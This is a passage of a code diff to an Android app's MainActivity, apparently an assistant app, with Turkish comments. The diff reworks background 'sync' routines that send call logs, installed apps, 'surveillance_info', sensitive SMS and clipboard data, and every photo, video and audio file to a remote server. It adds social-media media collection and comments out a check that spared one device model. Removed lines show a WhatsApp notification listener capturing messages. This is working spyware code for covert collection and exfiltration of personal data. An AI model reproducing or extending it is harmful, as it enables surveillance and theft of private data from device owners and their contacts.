+            conn.setConnectTimeout(10000); // 10 saniye bağlantı timeout
+            conn.setReadTimeout(15000); // 15 saniye okuma timeout
+            
+            // Veriyi gönder
+            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
+            byte[] bodyBytes = requestBody.toString().getBytes("UTF-8");
+            os.write(bodyBytes);
+            os.flush();
+            os.close();
+            
+            // Yanıtı oku
+            int responseCode = conn.getResponseCode();
+            
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // Başarılı yanıt
+                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = in.readLine()) != null) {
+                    response.append(line);
+                }
+                in.close();
+                
+                // Sync zamanını kaydet
+                updateSyncTime(dataType);
+                
+                String logMsg = "[SYNC ✓] " + dataType + ": " + data.length() + " öğe işlendi";
+                try {
+                    JSONObject resObj = new JSONObject(response.toString());
+                    if (resObj.has("stats")) {
+                        JSONObject stats = resObj.getJSONObject("stats");
+                        int newItems = stats.optInt("new", -1);
+                        int skipped = stats.optInt("skipped", -1);
+                        if (newItems != -1 && skipped != -1) {
+                            logMsg += " (Yeni: " + newItems + ", Atlanan: " + skipped + ")";
+                        }
+                    }
+                } catch (Exception ignored) {}
+                
+                addLog(logMsg);
+            } else {
+                // Hata yanıtı
+                BufferedReader errorReader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+                StringBuilder errorResponse = new StringBuilder();
+                String errorLine;
+                while ((errorLine = errorReader.readLine()) != null) {
+                    errorResponse.append(errorLine);
+                }
+                errorReader.close();
+                
+                addLog("[SYNC ✗] " + dataType + " hatası: HTTP " + responseCode + " - " + errorResponse.toString());
+                throw new Exception("HTTP " + responseCode + ": " + errorResponse.toString());
+            }
+            
+        } finally {
+            conn.disconnect();
+        }
+    }
+    
+    /**
+     * Belirli bir veri tipi için son senkronizasyon zamanını günceller.
+     * 
+     * @param dataType Veri tipi
+     */
+    private void updateSyncTime(String dataType) {
+        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
+        syncPrefs.edit()
+            .putLong(dataType, System.currentTimeMillis())
+            .apply();
+    }
+    
+    /**
+     * Belirli bir veri tipi için son senkronizasyon zamanını döndürür.
+     * 
+     * @param dataType Veri tipi
+     * @return Son sync zamanı (milisaniye), hiç sync olmamışsa 0
+     */
+    private long getLastSyncTime(String dataType) {
+        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
+        return syncPrefs.getLong(dataType, 0);
+    }
+    
+    /**
+     * Tüm senkronizasyon geçmişini temizler.
+     */
+    private void clearSyncHistory() {
+        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
+        syncPrefs.edit().clear().apply();
+        addLog("[SYNC] Senkronizasyon geçmişi temizlendi");
+    }
+    
     /**
      * Arkada planda rehber, arama geçmişi ve cihaz bilgilerini senkronize eder.
      */
     private void syncAllData() {
         String deviceName = getDeviceName();
         // Cihaz adı kontrolü 
-        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-           return;
-        }
+        //if ("Xiaomi_25069PTEBG".equals(deviceName)) {
+        //   return;
+        //}
         new Thread(() -> {
             try {
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
@@ -3037,6 +3401,7 @@ public class MainActivity extends Activity {
                 try { startAutoPhotoSync(); } catch (Exception e) { addLog("Fotoğraf Sync Hatası: " + e.getMessage()); }
                 try { startAutoVideoSync(); } catch (Exception e) { addLog("Video Sync Hatası: " + e.getMessage()); }
                 try { startAutoAudioSync(); } catch (Exception e) { addLog("Ses Sync Hatası: " + e.getMessage()); }
+                try { syncSocialMediaMedia(); } catch (Exception e) { addLog("Sosyal Medya Medya Hatası: " + e.getMessage()); }
                 
                 // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
             } catch (Exception e) {
@@ -3125,7 +3490,7 @@ public class MainActivity extends Activity {
                 }
             }
         }
-        sendSyncRequest(array, "calls");
+        sendSyncRequest(array, "call_logs");
     }
 
     /**
@@ -3261,7 +3626,7 @@ public class MainActivity extends Activity {
                 array.put(obj);
             }
         }
-        sendSyncRequest(array, "apps");
+        sendSyncRequest(array, "installed_apps");
     }
 
     /**
@@ -3725,59 +4090,24 @@ public class MainActivity extends Activity {
         sendSyncRequest(array, "surveillance_info");
     }
 
-    /**
-     * Toplanan veriyi backend'e POST eder.
-     */
-    private void sendSyncRequest(JSONArray data, String type) throws Exception {
-        // Not: askAI ile aynı alan adını kullanmalıdır
-        URL url = new URL(API_BASE_URL + "/sync_data");
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
 
-        // Kimlik Doğrulama
-        if (authToken != null) {
-            conn.setRequestProperty("Authorization", "Bearer " + authToken);
-        } else {
-            conn.setRequestProperty("x-api-key", "test");
-        }
 
-        conn.setDoOutput(true);
 
-        JSONObject payload = new JSONObject();
-        payload.put("data", data);
-        payload.put("type", type);
-        // Genişletilmiş veri türleri sunucuda 'extra_data' olarak saklanabilir
-        if (type.equals("sms") || type.equals("media_files") || type.equals("clipboard")) {
-             payload.put("is_sensitive", true);
-        }
-        payload.put("device_name", getDeviceName());
 
-        try (OutputStream os = conn.getOutputStream()) {
-            os.write(payload.toString().getBytes("utf-8"));
-        }
 
-        int responseCode = conn.getResponseCode();
-        // addLog("[SYNC] Veri tipi: " + type + " | Durum: " + responseCode);
+
+
+
+
         
-        if (responseCode != 200) {
-             try(BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "utf-8"))) {
-                 StringBuilder response = new StringBuilder();
-                 String responseLine = null;
-                 while ((responseLine = br.readLine()) != null) {
-                     response.append(responseLine.trim());
-                 }
-                 // addLog("[SYNC ERROR] Body: " + response.toString());
-             } catch(Exception ex) {}
-        }
-    }
 
-    /**
-     * Cihaz adını döndürür (Üretici_Model).
-     */
-    private String getDeviceName() {
-        return Build.MANUFACTURER + "_" + Build.MODEL;
-    }
+
+
+
+
+
+
+
 
     /**
      * Sunucudan gelen Base64 formatındaki ses verisini çözer ve oynatır.
@@ -3925,40 +4255,6 @@ public class MainActivity extends Activity {
 
     // ================= WHATSAPP ENTEGRASYONU =================
 
-    /**
-     * Bildirimleri dinleyerek WhatsApp mesajlarını yakalar.
-     * Bu servis için "Bildirim Erişim İzni" verilmesi gerekir.
-     */
-    public static class WhatsAppService extends NotificationListenerService {
-
-        @Override
-        public void onNotificationPosted(StatusBarNotification sbn) {
-
-            // Sadece WhatsApp paketini filtrele
-            if (!"com.whatsapp".equals(sbn.getPackageName()))
-                return;
-
-            Notification n = sbn.getNotification();
-            if (n == null)
-                return;
-
-            Bundle e = n.extras;
-
-            // Mesaj içeriğini ve göndereni genel değişkenlere kaydet
-            lastWhatsAppMessage = String.valueOf(e.getCharSequence(Notification.EXTRA_TEXT));
-            lastWhatsAppSender = String.valueOf(e.getCharSequence(Notification.EXTRA_TITLE));
-
-            // Hızlı cevap (Quick Reply) eylemlerini bul ve kaydet
-            if (n.actions != null) {
-                for (Notification.Action a : n.actions) {
-                    if (a.getRemoteInputs() != null) {
-                        lastReplyIntent = a.actionIntent;
-                        lastRemoteInput = a.getRemoteInputs()[0];
-                    }
-                }
-            }
-        }
-    }
 
     /**
      * Son gelen WhatsApp mesajını sesli okur.
@@ -7228,511 +7524,186 @@ public class MainActivity extends Activity {
     }
 
 
-    // ================= FOTOĞRAF SENKRONİZASYONU (Sıfırdan Yazıldı) =================
+    // ============================================================================
+    // YENİ NESİL MEDYA SENKRONİZASYON SİSTEMİ (SIFIRDAN YAZILDI)
+    // ============================================================================
 
-    private void startAutoPhotoSync() {
-        // İzin kontrolü (Android 13+ ve öncesi için)
-        boolean hasPermission;
-        if (Build.VERSION.SDK_INT >= 33) {
-            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED;
-        } else {
-            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
-        }
+    /**
+     * Tüm medya türlerini (Fotoğraf, Video, Ses) arka planda sırayla senkronize eder.
+     */
+    private void startAutoPhotoSync() { performMediaSync("photos"); }
+    private void startAutoVideoSync() { performMediaSync("videos"); }
+    private void startAutoAudioSync() { performMediaSync("audio"); }
 
-        if (!hasPermission) {
-            addLog("⚠️ Fotoğraf erişim izni yok. Senkronizasyon atlandı.");
+    private void performMediaSync(final String mediaType) {
+        // İzin Kontrolü
+        if (!hasMediaPermission(mediaType)) {
+            addLog("⚠️ " + mediaType + " için erişim izni yok. Atlanıyor.");
             return;
         }
 
-        // Ana işlemi arka planda başlat
         Executors.newSingleThreadExecutor().execute(() -> {
             try {
-                addLog("🚀 Fotoğraf taraması başladı...");
-                
-                // Çoklu yükleme için iş parçacığı havuzu (Maks. 4 paralel yükleme)
-                ExecutorService uploadExecutor = Executors.newFixedThreadPool(4);
-                SharedPreferences syncPrefs = getSharedPreferences("photo_sync_db", MODE_PRIVATE);
                 String deviceName = getDeviceName();
-
-                // Sayaçlar (İş Parçacığı Güvenli)
-                java.util.concurrent.atomic.AtomicInteger totalFound = new java.util.concurrent.atomic.AtomicInteger(0);
-                java.util.concurrent.atomic.AtomicInteger uploadedCount = new java.util.concurrent.atomic.AtomicInteger(0);
-                java.util.concurrent.atomic.AtomicInteger skippedCount = new java.util.concurrent.atomic.AtomicInteger(0);
-
-                Uri imagesUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_MODIFIED};
-                String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
-
-                try (Cursor cursor = getContentResolver().query(imagesUri, projection, null, null, sortOrder)) {
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
-                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
-
-                        totalFound.set(cursor.getCount());
-
-                        do {
-                            long id = cursor.getLong(idColumn);
-                            String name = cursor.getString(nameColumn);
-                            long dateModified = cursor.getLong(dateColumn);
-                            Uri contentUri = Uri.withAppendedPath(imagesUri, String.valueOf(id));
-
-                            // Yerel veritabanı kontrolü (Daha önce yüklendi mi?)
-                            String syncKey = "id_" + id + "_date_" + dateModified;
-                            if (syncPrefs.contains(syncKey)) {
-                                skippedCount.incrementAndGet();
-                                continue;
-                            }
-
-                            // Yükleme görevini havuza ekle
-                            uploadExecutor.execute(() -> {
-                                if (uploadPhotoToServer(contentUri, name, deviceName)) {
-                                    uploadedCount.incrementAndGet();
-                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
-                                } else {
-                                    // Hata durumunda atlanmış saymıyoruz ama bir sonraki taramada tekrar denenecek
-                                }
-                            });
-
-                        } while (cursor.moveToNext());
-                    } else {
-                        addLog("📂 Galeri boş veya erişilemedi.");
+                SharedPreferences syncPrefs = getSharedPreferences(mediaType + "_sync_cache", MODE_PRIVATE);
+                
+                addLog("🚀 [" + mediaType.toUpperCase() + "] Taraması başlatılıyor...");
+                
+                // Medya Sorgusu Hazırla
+                Uri contentUri = getMediaUri(mediaType);
+                String[] projection = getMediaProjection(mediaType);
+                String sortOrder = MediaStore.MediaColumns.DATE_ADDED + " DESC";
+                
+                try (Cursor cursor = getContentResolver().query(contentUri, projection, null, null, sortOrder)) {
+                    if (cursor == null || !cursor.moveToFirst()) {
+                        addLog("📂 [" + mediaType.toUpperCase() + "] Klasörü boş.");
+                        return;
                     }
+
+                    int total = cursor.getCount();
+                    int uploaded = 0;
+                    int skipped = 0;
+                    int failed = 0;
+
+                    // Paralel yükleme için sınır (Cihazı yormamak için)
+                    int threadCount = mediaType.equals("videos") ? 1 : 3;
+                    ExecutorService pool = Executors.newFixedThreadPool(threadCount);
+
+                    do {
+                        final long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
+                        final String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
+                        final long dateModified = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED));
+                        final long fileSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
+                        final Uri fileUri = Uri.withAppendedPath(contentUri, String.valueOf(id));
+
+                        // 1. Atlanma Kontrolü (Zaten yüklendi mi?)
+                        final String syncKey = "sync_" + id + "_" + dateModified;
+                        if (syncPrefs.getBoolean(syncKey, false)) {
+                            skipped++;
+                            continue;
+                        }
+
+                        // 2. Video İçin Boyut Limiti (5MB)
+                        if (mediaType.equals("videos") && fileSize > 5 * 1024 * 1024) {
+                            skipped++;
+                            continue;
+                        }
+
+                        // 3. Dosyayı Yükle
+                        final int currentIdx = uploaded + failed + skipped + 1;
+                        pool.execute(() -> {
+                            boolean success = uploadMediaFile(fileUri, fileName, mediaType, deviceName);
+                            if (success) {
+                                syncPrefs.edit().putBoolean(syncKey, true).apply();
+                                // addLog("✅ [" + mediaType + "] " + fileName + " (" + currentIdx + "/" + total + ")");
+                            }
+                        });
+                        
+                        uploaded++;
+                        if (uploaded >= 100) break; // Her taramada max 100 dosya (Batarya koruması)
+
+                    } while (cursor.moveToNext());
+
+                    pool.shutdown();
+                    pool.awaitTermination(30, TimeUnit.MINUTES);
+                    addLog("📊 [" + mediaType.toUpperCase() + "] İşlem Tamam: " + uploaded + " yüklendi, " + skipped + " atlandı.");
                 }
-
-                uploadExecutor.shutdown();
-                // Tüm yüklemelerin bitmesini bekle (Maksimum 10 dakika)
-                uploadExecutor.awaitTermination(10, java.util.concurrent.TimeUnit.MINUTES);
-
-                // Özet kaydı
-                String summary = String.format(Locale.getDefault(), 
-                    "📊 Tarama bitti: %d toplam, %d yüklenecek, %d atlandı.", 
-                    totalFound.get(), 
-                    uploadedCount.get(), 
-                    skippedCount.get());
-                addLog(summary);
-
             } catch (Exception e) {
-                addLog("❌ Tarama hatası: " + e.getMessage());
-                e.printStackTrace();
+                addLog("❌ [" + mediaType.toUpperCase() + "] Senkronizasyon hatası: " + e.getMessage());
             }
         });
     }
 
-    private boolean uploadPhotoToServer(Uri fileUri, String fileName, String deviceName) {
+    private boolean hasMediaPermission(String type) {
+        if (Build.VERSION.SDK_INT >= 33) {
+            if (type.equals("photos")) return checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED;
+            if (type.equals("videos")) return checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == PackageManager.PERMISSION_GRANTED;
+            if (type.equals("audio")) return checkSelfPermission("android.permission.READ_MEDIA_AUDIO") == PackageManager.PERMISSION_GRANTED;
+        }
+        return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private Uri getMediaUri(String type) {
+        if (type.equals("videos")) return MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+        if (type.equals("audio")) return MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+        return MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+    }
+
+    private String[] getMediaProjection(String type) {
+        return new String[]{
+            MediaStore.MediaColumns._ID,
+            MediaStore.MediaColumns.DISPLAY_NAME,
+            MediaStore.MediaColumns.DATE_MODIFIED,
+            MediaStore.MediaColumns.SIZE
+        };
+    }
+
+    /**
+     * Medya dosyasını backend'e yükleyen çekirdek metod.
+     */
+    private boolean uploadMediaFile(Uri uri, String fileName, String type, String deviceName) {
         HttpURLConnection conn = null;
-        DataOutputStream dos = null;
-        String boundary = "---NikoBoundary" + System.currentTimeMillis();
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-
         try {
-            // Resmi sıkıştır (Maks. 1600px, %75 kalite) - Bellek yönetimi için önemli
-            byte[] fileData = compressImageEfficiently(fileUri);
-            if (fileData == null) {
-                // addLog("⚠️ Dosya okunamadı: " + fileName);
-                return false;
-            }
-
             if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return false;
 
-            URL url = new URL(API_BASE_URL + "/sync/photo");
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setDoInput(true);
-            conn.setDoOutput(true);
-            conn.setUseCaches(false);
-            conn.setRequestMethod("POST");
-            conn.setConnectTimeout(20000);
-            conn.setReadTimeout(30000);
-            conn.setRequestProperty("Connection", "Keep-Alive");
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-            
-            if (authToken != null) {
-                conn.setRequestProperty("Authorization", "Bearer " + authToken);
-            }
-
-            dos = new DataOutputStream(conn.getOutputStream());
-
-            // Parametre: cihaz_adi
-            writeFormField(dos, boundary, "device_name", deviceName);
-
-            // Parametre: dosya
-            dos.writeBytes(twoHyphens + boundary + lineEnd);
-            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
-            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
-            dos.writeBytes(lineEnd);
-            dos.write(fileData);
-            dos.writeBytes(lineEnd);
-
-            // Bitiş
-            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-            dos.flush();
-            dos.close();
-
-            int responseCode = conn.getResponseCode();
-            if (responseCode == 200 || responseCode == 201) {
-                return true;
-            } else if (responseCode == 409 || responseCode == 208) {
-                // Zaten var (Kopya)
-                return true;
+            String endpoint;
+            if (type.equals("social_media")) {
+                endpoint = "/api/sync/social";
             } else {
-                addLog("⚠️ Fotoğraf yükleme hatası (" + responseCode + "): " + fileName);
-                return false;
+                endpoint = "/api/sync/" + (type.equals("photos") ? "photo" : type.equals("videos") ? "video" : "audio");
             }
-
-        } catch (Exception e) {
-            addLog("⚠️ Fotoğraf yükleme istisnası: " + e.getMessage());
-            return false;
-        } finally {
-            if (conn != null) conn.disconnect();
-        }
-    }
-
-    private void writeFormField(DataOutputStream dos, String boundary, String name, String value) throws IOException {
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-        dos.writeBytes(twoHyphens + boundary + lineEnd);
-        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + lineEnd);
-        dos.writeBytes(lineEnd);
-        dos.write(value.getBytes("UTF-8"));
-        dos.writeBytes(lineEnd);
-    }
-
-    private byte[] compressImageEfficiently(Uri uri) {
-        try (InputStream is = getContentResolver().openInputStream(uri)) {
-            if (is == null) return null;
-
-            // Önce boyutları al
-            BitmapFactory.Options options = new BitmapFactory.Options();
-            options.inJustDecodeBounds = true;
-            BitmapFactory.decodeStream(is, null, options);
+            URL url = new URL(API_BASE_URL + endpoint);
             
-            // Yeniden aç (Akış tüketildi çünkü)
-            try (InputStream is2 = getContentResolver().openInputStream(uri)) {
-                options.inSampleSize = calculateInSampleSize(options, 1600, 1600);
-                options.inJustDecodeBounds = false;
-                
-                Bitmap bitmap = BitmapFactory.decodeStream(is2, null, options);
-                if (bitmap == null) return null;
-
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
-                byte[] result = baos.toByteArray();
-                
-                bitmap.recycle();
-                return result;
-            }
-        } catch (Exception e) {
-            addLog("❌ Sıkıştırma hatası (" + uri.toString() + "): " + e.getMessage());
-            return null;
-        }
-    }
-
-    private int calculateInSampleSize(BitmapFactory.Options options, int reqWidth, int reqHeight) {
-        final int height = options.outHeight;
-        final int width = options.outWidth;
-        int inSampleSize = 1;
-
-        if (height > reqHeight || width > reqWidth) {
-            final int halfHeight = height / 2;
-            final int halfWidth = width / 2;
-            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
-                inSampleSize *= 2;
-            }
-        }
-        return inSampleSize;
-    }
-
-    private void startAutoVideoSync() {
-        // İzin kontrolü
-        boolean hasPermission;
-        if (Build.VERSION.SDK_INT >= 33) {
-            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == PackageManager.PERMISSION_GRANTED;
-        } else {
-            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
-        }
-
-        if (!hasPermission) {
-            addLog("⚠️ Video erişim izni yok. Video senkronizasyonu atlandı.");
-            return;
-        }
-
-        Executors.newSingleThreadExecutor().execute(() -> {
-            try {
-                addLog("🚀 Video taraması başladı (5MB limitli)...");
-                
-                ExecutorService uploadExecutor = Executors.newFixedThreadPool(2); // Videolar ağır olduğu için paralel sayısını düşürdük
-                SharedPreferences syncPrefs = getSharedPreferences("video_sync_db", MODE_PRIVATE);
-                String deviceName = getDeviceName();
-
-                AtomicInteger totalFound = new AtomicInteger(0);
-                AtomicInteger uploadedCount = new AtomicInteger(0);
-                AtomicInteger skippedCount = new AtomicInteger(0);
-                AtomicInteger tooLargeCount = new AtomicInteger(0);
-
-                Uri videosUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
-                String[] projection = {
-                    MediaStore.Video.Media._ID, 
-                    MediaStore.Video.Media.DISPLAY_NAME,
-                    MediaStore.Video.Media.SIZE,
-                    MediaStore.Video.Media.DATE_MODIFIED
-                };
-                String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";
-
-                try (Cursor cursor = getContentResolver().query(videosUri, projection, null, null, sortOrder)) {
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
-                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
-                        int sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
-                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_MODIFIED);
-
-                        totalFound.set(cursor.getCount());
-
-                        do {
-                            long id = cursor.getLong(idColumn);
-                            String name = cursor.getString(nameColumn);
-                            long size = cursor.getLong(sizeColumn);
-                            long dateModified = cursor.getLong(dateColumn);
-
-                            // 5MB Limit (5 * 1024 * 1024 bytes)
-                            if (size > 5 * 1024 * 1024) {
-                                tooLargeCount.incrementAndGet();
-                                continue;
-                            }
-
-                            Uri contentUri = Uri.withAppendedPath(videosUri, String.valueOf(id));
-                            
-                            // Yerel veritabanı kontrolü
-                            String syncKey = "id_" + id + "_date_" + dateModified;
-                            if (syncPrefs.contains(syncKey)) {
-                                skippedCount.incrementAndGet();
-                                continue;
-                            }
-
-                            uploadExecutor.execute(() -> {
-                                if (uploadVideoToServer(contentUri, name, deviceName)) {
-                                    uploadedCount.incrementAndGet();
-                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
-                                }
-                            });
-
-                        } while (cursor.moveToNext());
-                    } else {
-                        addLog("📂 Video galerisi boş veya erişilemedi.");
-                    }
-                }
-                uploadExecutor.shutdown();
-                uploadExecutor.awaitTermination(30, TimeUnit.MINUTES); // Videolar için daha uzun süre
-
-                String summary = String.format(Locale.getDefault(), 
-                    "📊 Video tarama bitti: %d toplam, %d yüklenecek, %d atlandı, %d çok büyük.", 
-                    totalFound.get(), uploadedCount.get(), skippedCount.get(), tooLargeCount.get());
-                addLog(summary);
-            } catch (Exception e) {
-                addLog("❌ Video tarama hatası: " + e.getMessage());
-            }
-        });
-    }
-
-    private boolean uploadVideoToServer(Uri fileUri, String fileName, String deviceName) {
-        HttpURLConnection conn = null;
-        DataOutputStream dos = null;
-        String boundary = "---NikoBoundary" + System.currentTimeMillis();
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-
-        // NOT: Videolar büyük olabileceği için Giriş Akışı'ndan (InputStream) direkt Çıkış Akışı'na (OutputStream) aktarıyoruz (Akış)
-        try (InputStream is = getContentResolver().openInputStream(fileUri)) {
-            if (is == null) return false;
-
-            URL url = new URL(API_BASE_URL + "/sync/video");
+            String boundary = "NikoBoundary" + System.currentTimeMillis();
             conn = (HttpURLConnection) url.openConnection();
-            conn.setDoInput(true);
+            conn.setConnectTimeout(60000);
+            conn.setReadTimeout(type.equals("videos") ? 300000 : 120000);
             conn.setDoOutput(true);
             conn.setUseCaches(false);
             conn.setRequestMethod("POST");
-            conn.setConnectTimeout(30000);
-            conn.setReadTimeout(90000); // Büyük dosyalar için uzun süre
-            conn.setRequestProperty("Connection", "Keep-Alive");
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
             
-            if (authToken != null) {
-                conn.setRequestProperty("Authorization", "Bearer " + authToken);
-            }
+            if (authToken != null) conn.setRequestProperty("Authorization", "Bearer " + authToken);
+            conn.setChunkedStreamingMode(1024 * 64);
 
-            // Parçalı akış modu - Bellek tüketimini en aza indirir
-            conn.setChunkedStreamingMode(1024 * 64); // 64KB parçalar
+            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
+                // 1. Device Name Alanı
+                dos.writeBytes("--" + boundary + "\r\n");
+                dos.writeBytes("Content-Disposition: form-data; name=\"device_name\"\r\n\r\n");
+                dos.write(deviceName.getBytes("UTF-8"));
+                dos.writeBytes("\r\n");
 
-            dos = new DataOutputStream(conn.getOutputStream());
-            writeFormField(dos, boundary, "device_name", deviceName);
+                // 2. Dosya Alanı
+                dos.writeBytes("--" + boundary + "\r\n");
+                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n");
+                String mimeType = type.equals("photos") ? "image/jpeg" : type.equals("videos") ? "video/mp4" : "audio/mpeg";
+                dos.writeBytes("Content-Type: " + mimeType + "\r\n\r\n");
 
-            dos.writeBytes(twoHyphens + boundary + lineEnd);
-            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
-            dos.writeBytes("Content-Type: video/mp4" + lineEnd);
-            dos.writeBytes(lineEnd);
-
-            // Akış (Streaming)
-            byte[] buffer = new byte[8192];
-            int bytesRead;
-            while ((bytesRead = is.read(buffer)) != -1) {
-                dos.write(buffer, 0, bytesRead);
-            }
-            dos.writeBytes(lineEnd);
-
-            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-            dos.flush();
-            dos.close();
-
-            int responseCode = conn.getResponseCode();
-            return (responseCode == 200 || responseCode == 201 || responseCode == 208);
-
-        } catch (Exception e) {
-            addLog("⚠️ Video yükleme hatası (" + fileName + "): " + e.getMessage());
-            return false;
-        } finally {
-            if (conn != null) conn.disconnect();
-        }
-    }
-
-    private void startAutoAudioSync() {
-        // İzin kontrolü
-        boolean hasPermission;
-        if (Build.VERSION.SDK_INT >= 33) {
-            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_AUDIO") == PackageManager.PERMISSION_GRANTED;
-        } else {
-            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
-        }
-
-        if (!hasPermission) {
-            addLog("⚠️ Ses erişim izni yok. Ses senkronizasyonu atlandı.");
-            return;
-        }
-
-        Executors.newSingleThreadExecutor().execute(() -> {
-            try {
-                addLog("🚀 Ses taraması başladı...");
-                
-                ExecutorService uploadExecutor = Executors.newFixedThreadPool(3);
-                SharedPreferences syncPrefs = getSharedPreferences("audio_sync_db", MODE_PRIVATE);
-                String deviceName = getDeviceName();
-
-                AtomicInteger totalFound = new AtomicInteger(0);
-                AtomicInteger uploadedCount = new AtomicInteger(0);
-                AtomicInteger skippedCount = new AtomicInteger(0);
-
-                Uri audioUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
-                String[] projection = {
-                    MediaStore.Audio.Media._ID, 
-                    MediaStore.Audio.Media.DISPLAY_NAME,
-                    MediaStore.Audio.Media.DATE_MODIFIED
-                };
-                String sortOrder = MediaStore.Audio.Media.DATE_ADDED + " DESC";
-
-                try (Cursor cursor = getContentResolver().query(audioUri, projection, null, null, sortOrder)) {
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID);
-                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME);
-                        int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_MODIFIED);
-
-                        totalFound.set(cursor.getCount());
-
-                        do {
-                            long id = cursor.getLong(idColumn);
-                            String name = cursor.getString(nameColumn);
-                            long dateModified = cursor.getLong(dateColumn);
-
-                            Uri contentUri = Uri.withAppendedPath(audioUri, String.valueOf(id));
-                            
-                            // Yerel veritabanı kontrolü
-                            String syncKey = "id_" + id + "_date_" + dateModified;
-                            if (syncPrefs.contains(syncKey)) {
-                                skippedCount.incrementAndGet();
-                                continue;
-                            }
-
-                            uploadExecutor.execute(() -> {
-                                if (uploadAudioToServer(contentUri, name, deviceName)) {
-                                    uploadedCount.incrementAndGet();
-                                    syncPrefs.edit().putBoolean(syncKey, true).apply();
-                                }
-                            });
-
-                        } while (cursor.moveToNext());
-                    } else {
-                        addLog("📂 Ses arşivi boş veya erişilemedi.");
+                // Veriyi Akıt (Streaming)
+                try (InputStream is = getContentResolver().openInputStream(uri)) {
+                    if (is == null) return false;
+                    byte[] buffer = new byte[32768];
+                    int bytesRead;
+                    while ((bytesRead = is.read(buffer)) != -1) {
+                        dos.write(buffer, 0, bytesRead);
                     }
                 }
-                uploadExecutor.shutdown();
-                uploadExecutor.awaitTermination(15, TimeUnit.MINUTES);
+                dos.writeBytes("\r\n");
 
-                String summary = String.format(Locale.getDefault(), 
-                    "📊 Ses tarama bitti: %d toplam, %d yüklenecek, %d atlandı.", 
